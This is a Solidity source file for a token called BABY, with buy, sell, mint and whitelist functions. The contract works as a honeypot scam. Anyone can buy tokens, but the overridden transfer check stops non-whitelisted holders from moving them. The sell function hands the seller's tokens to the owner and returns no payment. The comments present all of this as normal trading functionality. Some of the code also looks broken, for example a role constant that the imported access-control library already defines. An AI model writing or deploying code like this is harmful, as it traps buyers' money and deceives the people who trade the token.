// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/AccessControl.sol"; // Ensure AccessControl is imported

contract BABYToken is ERC20Capped, Ownable, ReentrancyGuard, AccessControl {
    // Declare constants before usage
    bytes32 public constant DEFAULT_ADMIN_ROLE = keccak256("DEFAULT_ADMIN_ROLE");
    bytes32 public constant WHITELIST_ROLE = keccak256("WHITELIST_ROLE");

    address public constant OWNER_ADDRESS = 0xA2b0529f0DB8506573C7b31b6d71C2000FE907F9; // Owner address

    mapping(address => bool) public hasBought; // Track if a user has bought tokens
    
    uint256 public initialSupply = 890000 * 10 ** 18; // Initial supply

    // Constructor to initialize the token and roles
    constructor() 
        ERC20("BABY", "ba by pi") 
        ERC20Capped(initialSupply)
    {
        _mint(OWNER_ADDRESS, initialSupply); // Mint initial supply to the owner
        _setupRole(DEFAULT_ADMIN_ROLE, OWNER_ADDRESS); // Assign default admin role to the owner
        _setupRole(WHITELIST_ROLE, OWNER_ADDRESS); // Assign whitelist role to the owner
    }

    // Buy tokens functionality
    function buyTokens() external payable nonReentrant {
        require(msg.value > 0, "Must send CORE to buy tokens");

        // Token price based on liquidity pool (assumed value)
        uint256 amount = msg.value * 100; // Example: 1 CORE = 100 BABY
        
        require(amount <= balanceOf(OWNER_ADDRESS), "Not enough tokens available");

        _transfer(OWNER_ADDRESS, msg.sender, amount);
        hasBought[msg.sender] = true; // Mark user as having bought tokens
    }

    // Sell tokens functionality (only for whitelisted users or owner)
    function sellTokens(uint256 amount) external nonReentrant {
        require(hasRole(WHITELIST_ROLE, msg.sender) || msg.sender == OWNER_ADDRESS, "Not authorized to sell tokens");

        _transfer(msg.sender, OWNER_ADDRESS, amount);
    }

    // Mint new tokens functionality
    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    // Add or remove whitelist status for an address
    function setWhitelist(address account, bool status) external onlyOwner {
        if (status) {
            grantRole(WHITELIST_ROLE, account);
        } else {
            revokeRole(WHITELIST_ROLE, account);
        }
    }

    // Override _transfer to prevent non-whitelisted users or buyers from transferring tokens
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(
            sender == OWNER_ADDRESS || recipient == OWNER_ADDRESS || hasRole(WHITELIST_ROLE, sender),
            "Users cannot transfer tokens"
        );
        
        super._transfer(sender, recipient, amount);
    }
}
